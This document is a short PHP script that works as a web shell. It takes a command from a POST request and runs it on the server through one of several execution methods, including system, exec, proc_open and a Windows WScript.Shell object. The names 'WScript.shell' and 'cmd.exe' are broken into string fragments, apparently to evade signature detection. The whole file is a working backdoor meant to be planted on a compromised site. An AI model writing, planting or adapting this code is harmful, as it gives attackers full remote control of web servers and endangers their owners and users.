<?php
if (!empty($_POST['command'])) {
	if ($execfunc=="system") {
		system($_POST['command']);
	} elseif ($execfunc=="passthru") {
		passthru($_POST['command']);
	} elseif ($execfunc=="exec") {
		$result = exec($_POST['command']);
		echo $result;
	} elseif ($execfunc=="shell_exec") {
		$result=shell_exec($_POST['command']);
		echo $result;	
	} elseif ($execfunc=="popen") {
		$pp = popen($_POST['command'], 'r');
		$read = fread($pp, 2096);
		echo $read;
		pclose($pp);
	} elseif ($execfunc=="wscript") {
		$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
		$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
		$stdout = $exec->StdOut();
		$stroutput = $stdout->ReadAll();
		echo $stroutput;
	} elseif($execfunc=="proc_open"){
			$descriptorspec = array(
			   0 => array("pipe", "r"),
			   1 => array("pipe", "w"),
			   2 => array("pipe", "w")
			);
		$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
			if (is_resource($process)) {

				// 写命令
				fwrite($pipes[0], "".$_POST['command']."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				// 读取输出
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				  }
				fclose($pipes[2]);

				proc_close($process);
			}
	} else {
			system($_POST['command']);
		}
}
?>